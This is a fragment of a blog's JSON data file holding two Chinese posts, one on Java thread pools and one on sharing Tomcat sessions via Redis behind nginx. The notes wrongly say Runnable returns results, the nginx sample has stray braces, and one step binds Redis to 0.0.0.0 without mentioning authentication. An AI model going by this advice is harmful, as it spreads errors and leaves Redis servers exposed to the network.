id=\"三-线程池加异步，为什么\"><a href=\"#三-线程池加异步，为什么\" class=\"headerlink\" title=\"三.线程池加异步，为什么\"></a>三.线程池加异步，为什么</h1><p>异步任务特点就是不阻塞。<br><br>和线程池一起使用时，可以异步的获取线程的返回结果<br></p>\n<p>重点是这个可以很方便的获取到返回结果。<br></p>\n<p>其它原因，还未理解到<br></p>\n<h1 id=\"四-Runnable-和-Callable\"><a href=\"#四-Runnable-和-Callable\" class=\"headerlink\" title=\"四.Runnable 和  Callable\"></a>四.Runnable 和  Callable</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public interface Runnable &#123;</span><br><span class=\"line\">    public abstract void run();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public interface Callable&lt;V&gt; &#123;</span><br><span class=\"line\">    V call() throws Exception;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>可以看到:<br></p>\n<p>1.runable可以得到返回结果，所以可以配合Future实现异步<br><br>2.可以抛出异常<br></p>\n<h1 id=\"五-Spring-Async\"><a href=\"#五-Spring-Async\" class=\"headerlink\" title=\"五.Spring @Async\"></a>五.Spring @Async</h1><p>spring中 @Async 会优先使用自定义线程池，如果没有自定义的Executor，所以使用缺省的TaskExecutor</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"一-为什么要用线程池\"><a href=\"#一-为什么要用线程池\" class=\"headerlink\" title=\"一.为什么要用线程池\"></a>一.为什么要用线程池</h1><p>为了并发的执行任务，减少任务执行时间，提升性能 —多线程.<br><br>减少创建和销毁线程的次数(复用)，同时方便管理 — 线程池<br></p>\n<h1 id=\"二-线程池\"><a href=\"#二-线程池\" class=\"headerlink\" title=\"二.线程池\"></a>二.线程池</h1><h2 id=\"1-ThreadPoolExecutor\"><a href=\"#1-ThreadPoolExecutor\" class=\"headerlink\" title=\"1.ThreadPoolExecutor\"></a>1.ThreadPoolExecutor</h2><p>ThreadPoolExecutor 允许我们灵活的定义自己的线程池.<br></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ThreadPoolExecutor(int corePoolSize,</span><br><span class=\"line\">                        int maximumPoolSize,</span><br><span class=\"line\">                        long keepAliveTime,</span><br><span class=\"line\">                        TimeUnit unit,</span><br><span class=\"line\">                        BlockingQueue&lt;Runnable&gt; workQueue,</span><br><span class=\"line\">                        ThreadFactory threadFactory,</span><br><span class=\"line\">                        RejectedExecutionHandler handler)</span><br></pre></td></tr></table></figure>\n<ul>\n<li>corePoolSize</li>\n</ul>\n<p>核心线程数，默认情况下核心线程会一直存活，即使处于闲置状态也不会受存keepAliveTime限制。除非将allowCoreThreadTimeOut设置为true。</p>\n<ul>\n<li>maximumPoolSize</li>\n</ul>\n<p>线程池所能容纳的最大线程数。超过这个数的线程将被阻塞。当任务队列为没有设置大小的LinkedBlockingDeque时，这个值无效。</p>\n<ul>\n<li>keepAliveTime</li>\n</ul>\n<p>非核心线程的闲置超时时间，超过这个时间就会被回收</p>\n<ul>\n<li>unit</li>\n</ul>\n<p>指定keepAliveTime的单位，如TimeUnit.SECONDS。当将allowCoreThreadTimeOut设置为true时对corePoolSize生效。</p>\n<ul>\n<li>workQueue</li>\n</ul>\n<p>线程池中的任务队列.<br><br>常用的有三种队列：SynchronousQueue,LinkedBlockingDeque,ArrayBlockingQueue。</p>\n<ul>\n<li>threadFactory</li>\n</ul>\n<p>线程工厂，提供创建新线程的功能。ThreadFactory是一个接口，只有一个方法</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public interface ThreadFactory &#123;</span><br><span class=\"line\">  Thread newThread(Runnable r);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>RejectedExecutionHandler</li>\n</ul>\n<p>RejectedExecutionHandler也是一个接口，只有一个方法</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public interface RejectedExecutionHandler &#123;</span><br><span class=\"line\">  void rejectedExecution(Runnable var1, ThreadPoolExecutor var2);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>默认: AbortPolicy、CallerRunsPolicy、DiscardOldestPolicy、DiscardPolicy</p>\n<h2 id=\"2-四种线程池-和-ThreadPoolExecutor关系\"><a href=\"#2-四种线程池-和-ThreadPoolExecutor关系\" class=\"headerlink\" title=\"2.四种线程池 和 ThreadPoolExecutor关系\"></a>2.四种线程池 和 ThreadPoolExecutor关系</h2><p>四种线程池只是和ThreadPoolExecutor一样的ExecutorSerivice的其它四种实现方式  ，我们可以根据情况灵活选用或者自定义自己的线程池.<br></p>\n<ul>\n<li>newSingleThreadExecutor</li>\n</ul>\n<p>创建一个单线程的线程池,这个线程池只有一个线程在工作，也就是相当于单线程串行执行所有任务。如果这个唯一的线程因为异常结束，那么会有一个新的线程来替代它。此线程池保证所有任务的执行顺序按照任务的提交顺序执行</p>\n<ul>\n<li>newFixedThreadPool</li>\n</ul>\n<p>创建固定大小的线程池。每次提交一个任务就创建一个线程，直到线程达到线程池的最大大小。线程池的大小一旦达到最大值就会保持不变，如果某个线程因为执行异常而结束，那么线程池会补充一个新线程。</p>\n<ul>\n<li>newCachedThreadPool</li>\n</ul>\n<p>创建一个可缓存的线程池。如果线程池的大小超过了处理任务所需要的线程，<br>那么就会回收部分空闲（60秒不执行任务）的线程，当任务数增加时，此线程池又可以智能的添加新线程来处理任务。此线程池不会对线程池大小做限制，线程池大小完全依赖于操作系统（或者说JVM）能够创建的最大线程大小。</p>\n<ul>\n<li>newScheduledThreadPool</li>\n</ul>\n<p>创建一个大小无限的线程池。此线程池支持定时以及周期性执行任务的需求。</p>\n<h2 id=\"3-ThreadPoolExecutor-和-ThreadPoolTaskExecutor关系\"><a href=\"#3-ThreadPoolExecutor-和-ThreadPoolTaskExecutor关系\" class=\"headerlink\" title=\"3.ThreadPoolExecutor 和 ThreadPoolTaskExecutor关系\"></a>3.ThreadPoolExecutor 和 ThreadPoolTaskExecutor关系</h2><p>ThreadPoolTaskExecutor 是 ThreadPoolExecutor 在spring中的实现方式。</p>\n<h1 id=\"三-线程池加异步，为什么\"><a href=\"#三-线程池加异步，为什么\" class=\"headerlink\" title=\"三.线程池加异步，为什么\"></a>三.线程池加异步，为什么</h1><p>异步任务特点就是不阻塞。<br><br>和线程池一起使用时，可以异步的获取线程的返回结果<br></p>\n<p>重点是这个可以很方便的获取到返回结果。<br></p>\n<p>其它原因，还未理解到<br></p>\n<h1 id=\"四-Runnable-和-Callable\"><a href=\"#四-Runnable-和-Callable\" class=\"headerlink\" title=\"四.Runnable 和  Callable\"></a>四.Runnable 和  Callable</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public interface Runnable &#123;</span><br><span class=\"line\">    public abstract void run();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public interface Callable&lt;V&gt; &#123;</span><br><span class=\"line\">    V call() throws Exception;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>可以看到:<br></p>\n<p>1.runable可以得到返回结果，所以可以配合Future实现异步<br><br>2.可以抛出异常<br></p>\n<h1 id=\"五-Spring-Async\"><a href=\"#五-Spring-Async\" class=\"headerlink\" title=\"五.Spring @Async\"></a>五.Spring @Async</h1><p>spring中 @Async 会优先使用自定义线程池，如果没有自定义的Executor，所以使用缺省的TaskExecutor</p>\n"},{"title":"tomcat利用redis保持session共享","date":"2018-09-28T19:47:53.000Z","_content":"#### 1.需求\n不同Ip主机上的tomcat,保持session同步。<br>\n#### 2.查资料\n一般做法为，利用redis保持session,不同tomcat从redis存取，外层nginx做tomcat的负载均衡。<br>\n开源项目https://github.com/jcoleman/tomcat-redis-session-manager， 提供了tomcat连接redis的jar包，但是，我试了多次，总是不行，版本不对，或者class找不到等。<br>\n解决方案参照：https://my.oschina.net/Listening/blog/674759, 直接用gradle生成jar包。\n\n#### 3.实现\ntomcat7.0.61/nginx1.10.3/ubuntu虚拟机\n###### 1.tomcat\n- 解压两个tomcat到两个虚拟机\n- conf/server.xml更改端口，使之不重复\n- 添加index.jsp到 webapps/Root目录下\n- 分别启动tomcat,看看是否正常\n```\n<%@ page language=\"java\" import=\"java.util.*\" pageEncoding=\"UTF-8\"%>  \n<%  \nString path = request.getContextPath();  \nString basePath = request.getScheme()+\"://\"+request.getServerName()+\":\"+request.getServerPort()+path+\"/\";  \n%>  \n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\">  \n<html>  \n  <head>  \n    <base href=\"<%=basePath%>\">  \n    <title>My JSP 'index.jsp' starting page</title>  \n    <meta http-equiv=\"pragma\" content=\"no-cache\">  \n    <meta http-equiv=\"cache-control\" content=\"no-cache\">  \n    <meta http-equiv=\"expires\" content=\"0\">      \n    <meta http-equiv=\"keywords\" content=\"keyword1,keyword2,keyword3\">  \n    <meta http-equiv=\"description\" content=\"This is my page\">  \n    <!--\n    <link rel=\"stylesheet\" type=\"text/css\" href=\"styles.css\">\n    -->  \n  </head>  \n  <body>  \n        SessionID:<%=session.getId()%>  \n        <BR>  \n        SessionIP:<%=request.getServerName()%>  \n        <BR>  \n        SessionPort:<%=request.getServerPort()%>  \n        <%  \n        out.println(\"This is Tomcat Server 22222\");  \n        %>  \n  </body>  \n</html>\n```\n\n###### 2.nginx\n不使用ngnix也行，在浏览器手动分别访问两个tomcat<br>\n编辑/etc/nginx/nginx.conf 添加tomcat配置<br>\n```\nupstream tomcat{\n\t#ip_hash;\n\tserver   192.168.93.132:8081\tweight=1;\n\tserver   192.168.93.133:8080\tweight=1;\n\t}\nserver{\n\tlisten 80;\n\tserver_name localhost 127.0.0.1;\n            location / {\n                root    html;\n                index   index.jsp;\n                proxy_pass      http://tomcat;\n                proxy_set_header        X-Real-IP       $remote_addr;\n                client_max_body_size    100m;\n            }\n\t}\n}\n\n}\n```\n\n###### 3.redis\n这一步很坑，参照：https://my.oschina.net/Listening/blog/674759, 进行配置<br>\n\n将生成的jar包全部放入tomcat/lib/目录下<br>\n编辑tomcat/conf/content.xml文件,添加\n```\n<Context>\n    ........\n    <!--\n    <Valve className=\"org.apache.catalina.valves.CometConnectionManagerValve\" />\n    -->\n<Valve className=\"com.orangefunction.tomcat.redissessions.RedisSessionHandlerValve\" />\n<Manager className=\"com.orangefunction.tomcat.redissessions.RedisSessionManager\"\n    host=\"127.0.0.1\" //注意这里，应该是redis地址\n    port=\"6379\"\n    database=\"0\"\n    maxInactiveInterval=\"60\"\n/>\n\n</Context>\n```\n在这里可能会出现redis连接不上问题，原因是/etc/redis/redis.conf 文件里默认配置为 bind 127.0.0.1, 改为 0.0.0.0<br>\n除此之外也有可能防火墙原因.<br>\n重启 redis-server /etc/redis/redis.conf <br>\n查看是否监听0.0.0.0:6379端口 ps -ef | grep redis\n![redisport](./redis.png)\n\n\n#### 4. 重启tomcat 查看效果\n![redisport](./tomcat1.png)\n![redisport](./tomcat2.png)\n\n可以看到现在session已经保持不变\n\n\n#### 5.2018-12-26补充\n公司项目是用的tomcat6部署，所以直接用上面打包好的jar包会报:java.lang.AbstractMethodError错误，意思是jar包冲突。<br>\n解决办法:<br>\n去github上下载tomcat6的分支，重新打包,将dist目录下所有jar包和bulid/lib目录下的tomcat-redis-session-XXXX.jar放到tomcat的lib目录下<br>\n```\napply plugin: 'java'\napply plugin: 'maven'\napply plugin: 'signing'\n\ngroup = 'com.orangefunction'\nversion = '1.2.0'\n\nrepositories {\n  mavenCentral()\n}\n\ncompileJava {\n  sourceCompatibility = 1.7\n  targetCompatibility = 1.7\n}\n\ndependencies {\n  //compile group: 'org.apache.tomcat', name: 'tomcat-catalina',\n   version: '6.0.37'\n  //用tomcat6.0.37的jar打包\n  compile fileTree(dir: 'pathto/your/tomcat6.0.37/lib', include: ['*.jar'])\n  compile group: 'redis.clients', name: 'jedis', version: '2.5.2'\n  compile group: 'org.apache.commons', name: 'commons-pool2', version: '2.2'\n\n  testCompile group: 'junit', name: 'junit', version: '4.+'\n  testCompile 'org.hamcrest:hamcrest-core:1.3'\n  testCompile 'org.hamcrest:hamcrest-library:1.3'\n  testCompile 'org.mockito:mockito-all:1.9.5'\n  testCompile group: 'org.apache.tomcat', name: 'tomcat-coyote', version: '6.0.37'\n}\n\n\n```\n在部署时，注意className名字，和你打包生成的一致\n```\n<Valve className=\"com.radiadesign.catalina.session.RedisSessionHandlerValve\" />\n<Manager className=\"com.radiadesign.catalina.session.RedisSessionManager\"\n         host=\"localhost\" <!-- optional: defaults to \"localhost\" -->\n         port=\"6379\" <!-- optional: defaults to \"6379\" -->\n         database=\"0\" <!-- optional: defaults to \"0\" -->\n         maxInactiveInterval=\"60\" <!-- optional: defaults to \"60\" (in seconds) --> />\n```\n\n如果还报configure XXX.xml错误<br>\n到tomcat/conf/Catalina/localhost目录下，只保留你的项目.xml\n\n### 2019/5/29补充\n基于tomcat内存的方式:\nhttps://www.cnblogs.com/beyang/p/9122406.html\n\n### 2019/6/4补充\ntomcat7版本，注意jar包冲突<br>\n经测试的一个可用版本：<br>\n- apache-tomcat-7.0.61\n- commons-logging-1.1.3.jar\n- commons-pool-1.6.jar\n- commons-pool2-2.2.jar\n- jedis-2.2.1.jar\n- tomcat-redis-session-manager-1.2-tomcat-7-1.2.jar\n\ntomcat-redis-session-manager-1.2-tomcat-7-1.2.jar为github下载源码打包<br>\nhttps://github.com/jcoleman/tomcat-redis-session-manager/archive/1.2-tomcat-7.zip<br>\n","source":"_posts/java/tomcat-session/tomcat-redis-session.md","raw":"---\ntitle: tomcat利用redis保持session共享\ndate: 2018-09-28 15:47:53\ntags: [tomcat]\n---\n#### 1.需求\n不同Ip主机上的tomcat,保持session同步。<br>\n#### 2.查资料\n一般做法为，利用redis保持session,不同tomcat从redis存取，外层nginx做tomcat的负载均衡。<br>\n开源项目https://github.com/jcoleman/tomcat-redis-session-manager， 提供了tomcat连接redis的jar包，但是，我试了多次，总是不行，版本不对，或者class找不到等。<br>\n解决方案参照：https://my.oschina.net/Listening/blog/674759, 直接用gradle生成jar包。\n\n#### 3.实现\ntomcat7.0.61/nginx1.10.3/ubuntu虚拟机\n###### 1.tomcat\n- 解压两个tomcat到两个虚拟机\n- conf/server.xml更改端口，使之不重复\n- 添加index.jsp到 webapps/Root目录下\n- 分别启动tomcat,看看是否正常\n```\n<%@ page language=\"java\" import=\"java.util.*\" pageEncoding=\"UTF-8\"%>  \n<%  \nString path = request.getContextPath();  \nString basePath = request.getScheme()+\"://\"+request.getServerName()+\":\"+request.getServerPort()+path+\"/\";  \n%>  \n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\">  \n<html>  \n  <head>  \n    <base href=\"<%=basePath%>\">  \n    <title>My JSP 'index.jsp' starting page</title>  \n    <meta http-equiv=\"pragma\" content=\"no-cache\">  \n    <meta http-equiv=\"cache-control\" content=\"no-cache\">  \n    <meta http-equiv=\"expires\" content=\"0\">      \n    <meta http-equiv=\"keywords\" content=\"keyword1,keyword2,keyword3\">  \n    <meta http-equiv=\"description\" content=\"This is my page\">  \n    <!--\n    <link rel=\"stylesheet\" type=\"text/css\" href=\"styles.css\">\n    -->  \n  </head>  \n  <body>  \n        SessionID:<%=session.getId()%>  \n        <BR>  \n        SessionIP:<%=request.getServerName()%>  \n        <BR>  \n        SessionPort:<%=request.getServerPort()%>  \n        <%  \n        out.println(\"This is Tomcat Server 22222\");  \n        %>  \n  </body>  \n</html>\n```\n\n###### 2.nginx\n不使用ngnix也行，在浏览器手动分别访问两个tomcat<br>\n编辑/etc/nginx/nginx.conf 添加tomcat配置<br>\n```\nupstream tomcat{\n\t#ip_hash;\n\tserver   192.168.93.132:8081\tweight=1;\n\tserver   192.168.93.133:8080\tweight=1;\n\t}\nserver{\n\tlisten 80;\n\tserver_name localhost 127.0.0.1;\n            location / {\n                root    html;\n                index   index.jsp;\n                proxy_pass      http://tomcat;\n                proxy_set_header        X-Real-IP       $remote_addr;\n                client_max_body_size    100m;\n            }\n\t}\n}\n\n}\n```\n\n###### 3.redis\n这一步很坑，参照：https://my.oschina.net/Listening/blog/674759, 进行配置<br>\n\n将生成的jar包全部放入tomcat/lib/目录下<br>\n编辑tomcat/conf/content.xml文件,添加\n```\n<Context>\n    ........\n    <!--\n    <Valve className=\"org.apache.catalina.valves.CometConnectionManagerValve\" />\n    -->\n<Valve className=\"com.orangefunction.tomcat.redissessions.RedisSessionHandlerValve\" />\n<Manager className=\"com.orangefunction.tomcat.redissessions.RedisSessionManager\"\n    host=\"127.0.0.1\" //注意这里，应该是redis地址\n    port=\"6379\"\n    database=\"0\"\n    maxInactiveInterval=\"60\"\n/>\n\n</Context>\n```\n在这里可能会出现redis连接不上问题，原因是/etc/redis/redis.conf 文件里默认配置为 bind 127.0.0.1, 改为 0.0.0.0<br>\n除此之外也有可能防火墙原因.<br>\n重启 redis-server /etc/redis/redis.conf <br>\n查看是否监听0.0.0.0:6379端口 ps -ef | grep redis\n![redisport](./redis.png)\n\n\n#### 4. 重启tomcat 查看效果\n![redisport](./tomcat1.png)\n![redisport](./tomcat2.png)\n\n可以看到现在session已经保持不变\n\n\n#### 5.2018-12-26补充\n公司项目是用的tomcat6部署，所以直接用上面打包好的jar包会报:java.lang.AbstractMethodError错误，意思是jar包冲突。<br>\n解决办法:<br>\n去github上下载tomcat6的分支，重新打包,将dist目录下所有jar包和bulid/lib目录下的tomcat-redis-session-XXXX.jar放到tomcat的lib目录下<br>\n```\napply plugin: 'java'\napply plugin: 'maven'\napply plugin: 'signing'\n\ngroup = 'com.orangefunction'\nversion = '1.2.0'\n\nrepositories {\n  mavenCentral()\n}\n\ncompileJava {\n  sourceCompatibility = 1.7\n  targetCompatibility = 1.7\n}\n\ndependencies {\n  //compile group: 'org.apache.tomcat', name: 'tomcat-catalina',\n   version: '6.0.37'\n  //用tomcat6.0.37的jar打包\n  compile fileTree(dir: 'pathto/your/tomcat6.0.37/lib', include: ['*.jar'])\n  compile group: 'redis.clients', name: 'jedis', version: '2.5.2'\n  compile group: 'org.apache.commons', name: 'commons-pool2', version: '2.2'\n\n  testCompile group: 'junit', name: 'junit', version: '4.+'\n  testCompile 'org.hamcrest:hamcrest-core:1.3'\n  testCompile 'org.hamcrest:hamcrest-library:1.3'\n  testCompile 'org.mockito:mockito-all:1.9.5'\n  testCompile group: 'org.apache.tomcat', name: 'tomcat-coyote', version: '6.0.37'\n}\n\n\n```\n在部署时，注意className名字，和你打包生成的一致\n```\n<Valve className=\"com.radiadesign.catalina.session.RedisSessionHandlerValve\" />\n<Manager className=\"com.radiadesign.catalina.session.RedisSessionManager\"\n         host=\"localhost\" <!-- optional: defaults to \"localhost\" -->\n         port=\"6379\" <!-- optional: defaults to \"6379\" -->\n         database=\"0\" <!-- optional: defaults to \"0\" -->\n         maxInactiveInterval=\"60\" <!-- optional: defaults to \"60\" (in seconds) --> />\n```\n\n如果还报configure XXX.xml错误<br>\n到tomcat/conf/Catalina/localhost目录下，只保留你的项目.xml\n\n### 2019/5/29补充\n基于tomcat内存的方式:\nhttps://www.cnblogs.com/beyang/p/9122406.html\n\n### 2019/6/4补充\ntomcat7版本，注意jar包冲突<br>\n经测试的一个可用版本：<br>\n- apache-tomcat-7.0.61\n- commons-logging-1.1.3.jar\n- commons-pool-1.6.jar\n- commons-pool2-2.2.jar\n- jedis-2.2.1.jar\n- tomcat-redis-session-manager-1.2-tomcat-7-1.2.jar\n\ntomcat-redis-session-manager-1.2-tomcat-7-1.2.jar为github下载源码打包<br>\nhttps://github.com/jcoleman/tomcat-redis-session-manager/archive/1.2-tomcat-7.zip<br>\n","slug":"java/tomcat-session/tomcat-redis-session","published":1,"updated":"2019-10-13T12:15:12.172Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321lp004q6dcpwg2r9d1t","content":"<h4 id=\"1-需求\"><a href=\"#1-需求\" class=\"headerlink\" title=\"1.需求\"></a>1.需求</h4><p>不同Ip主机上的tomcat,保持session同步。<br></p>\n<h4 id=\"2-查资料\"><a href=\"#2-查资料\" class=\"headerlink\" title=\"2.查资料\"></a>2.查资料</h4><p>一般做法为，利用redis保持session,不同tomcat从redis存取，外层nginx做tomcat的负载均衡。<br><br>开源项目<a href=\"https://github.com/jcoleman/tomcat-redis-session-manager，\" target=\"_blank\" rel=\"noopener\">https://github.com/jcoleman/tomcat-redis-session-manager，</a> 提供了tomcat连接redis的jar包，但是，我试了多次，总是不行，版本不对，或者class找不到等。<br><br>解决方案参照：<a href=\"https://my.oschina.net/Listening/blog/674759\" target=\"_blank\" rel=\"noopener\">https://my.oschina.net/Listening/blog/674759</a>, 直接用gradle生成jar包。</p>\n<h4 id=\"3-实现\"><a href=\"#3-实现\" class=\"headerlink\" title=\"3.实现\"></a>3.实现</h4><p>tomcat7.0.61/nginx1.10.3/ubuntu虚拟机</p>\n<h6 id=\"1-tomcat\"><a href=\"#1-tomcat\" class=\"headerlink\" title=\"1.tomcat\"></a>1.tomcat</h6><ul>\n<li>解压两个tomcat到两个虚拟机</li>\n<li>conf/server.xml更改端口，使之不重复</li>\n<li>添加index.jsp到 webapps/Root目录下</li>\n<li>分别启动tomcat,看看是否正常<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*&quot; pageEncoding=&quot;UTF-8&quot;%&gt;  </span><br><span class=\"line\">&lt;%  </span><br><span class=\"line\">String path = request.getContextPath();  </span><br><span class=\"line\">String basePath = request.getScheme()+&quot;://&quot;+request.getServerName()+&quot;:&quot;+request.getServerPort()+path+&quot;/&quot;;  </span><br><span class=\"line\">%&gt;  </span><br><span class=\"line\">&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;&gt;  </span><br><span class=\"line\">&lt;html&gt;  </span><br><span class=\"line\">  &lt;head&gt;  </span><br><span class=\"line\">    &lt;base href=&quot;&lt;%=basePath%&gt;&quot;&gt;  </span><br><span class=\"line\">    &lt;title&gt;My JSP &apos;index.jsp&apos; starting page&lt;/title&gt;  </span><br><span class=\"line\">    &lt;meta http-equiv=&quot;pragma&quot; content=&quot;no-cache&quot;&gt;  </span><br><span class=\"line\">    &lt;meta http-equiv=&quot;cache-control&quot; content=&quot;no-cache&quot;&gt;  </span><br><span class=\"line\">    &lt;meta http-equiv=&quot;expires&quot; content=&quot;0&quot;&gt;      </span><br><span class=\"line\">    &lt;meta http-equiv=&quot;keywords&quot; content=&quot;keyword1,keyword2,keyword3&quot;&gt;  </span><br><span class=\"line\">    &lt;meta http-equiv=&quot;description&quot; content=&quot;This is my page&quot;&gt;  </span><br><span class=\"line\">    &lt;!--</span><br><span class=\"line\">    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;styles.css&quot;&gt;</span><br><span class=\"line\">    --&gt;  </span><br><span class=\"line\">  &lt;/head&gt;  </span><br><span class=\"line\">  &lt;body&gt;  </span><br><span class=\"line\">        SessionID:&lt;%=session.getId()%&gt;  </span><br><span class=\"line\">        &lt;BR&gt;  </span><br><span class=\"line\">        SessionIP:&lt;%=request.getServerName()%&gt;  </span><br><span class=\"line\">        &lt;BR&gt;  </span><br><span class=\"line\">        SessionPort:&lt;%=request.getServerPort()%&gt;  </span><br><span class=\"line\">        &lt;%  </span><br><span class=\"line\">        out.println(&quot;This is Tomcat Server 22222&quot;);  </span><br><span class=\"line\">        %&gt;  </span><br><span class=\"line\">  &lt;/body&gt;  </span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h6 id=\"2-nginx\"><a href=\"#2-nginx\" class=\"headerlink\" title=\"2.nginx\"></a>2.nginx</h6><p>不使用ngnix也行，在浏览器手动分别访问两个tomcat<br><br>编辑/etc/nginx/nginx.conf 添加tomcat配置<br><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">upstream tomcat&#123;</span><br><span class=\"line\">\t#ip_hash;</span><br><span class=\"line\">\tserver   192.168.93.132:8081\tweight=1;</span><br><span class=\"line\">\tserver   192.168.93.133:8080\tweight=1;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">server&#123;</span><br><span class=\"line\">\tlisten 80;</span><br><span class=\"line\">\tserver_name localhost 127.0.0.1;</span><br><span class=\"line\">            location / &#123;</span><br><span class=\"line\">                root    html;</span><br><span class=\"line\">                index   index.jsp;</span><br><span class=\"line\">                proxy_pass      http://tomcat;</span><br><span class=\"line\">                proxy_set_header        X-Real-IP       $remote_addr;</span><br><span class=\"line\">                client_max_body_size    100m;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h6 id=\"3-redis\"><a href=\"#3-redis\" class=\"headerlink\" title=\"3.redis\"></a>3.redis</h6><p>这一步很坑，参照：<a href=\"https://my.oschina.net/Listening/blog/674759\" target=\"_blank\" rel=\"noopener\">https://my.oschina.net/Listening/blog/674759</a>, 进行配置<br></p>\n<p>将生成的jar包全部放入tomcat/lib/目录下<br><br>编辑tomcat/conf/content.xml文件,添加<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;Context&gt;</span><br><span class=\"line\">    ........</span><br><span class=\"line\">    &lt;!--</span><br><span class=\"line\">    &lt;Valve className=&quot;org.apache.catalina.valves.CometConnectionManagerValve&quot; /&gt;</span><br><span class=\"line\">    --&gt;</span><br><span class=\"line\">&lt;Valve className=&quot;com.orangefunction.tomcat.redissessions.RedisSessionHandlerValve&quot; /&gt;</span><br><span class=\"line\">&lt;Manager className=&quot;com.orangefunction.tomcat.redissessions.RedisSessionManager&quot;</span><br><span class=\"line\">    host=&quot;127.0.0.1&quot; //注意这里，应该是redis地址</span><br><span class=\"line\">    port=&quot;6379&quot;</span><br><span class=\"line\">    database=&quot;0&quot;</span><br><span class=\"line\">    maxInactiveInterval=&quot;60&quot;</span><br><span class=\"line\">/&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;/Context&gt;</span><br></pre></td></tr></table></figure></p>\n<p>在这里可能会出现redis连接不上问题，原因是/etc/redis/redis.conf 文件里默认配置为 bind 127.0.0.1, 改为 0.0.0.0<br><br>除此之外也有可能防火墙原因.<br><br>重启 redis-server /etc/redis/redis.conf <br><br>查看是否监听0.0.0.0:6379端口 ps -ef | grep redis<br><img src=\"./redis.png\" alt=\"redisport\"></p>\n<h4 id=\"4-重启tomcat-查看效果\"><a href=\"#4-重启tomcat-查看效果\" class=\"headerlink\" title=\"4. 重启tomcat 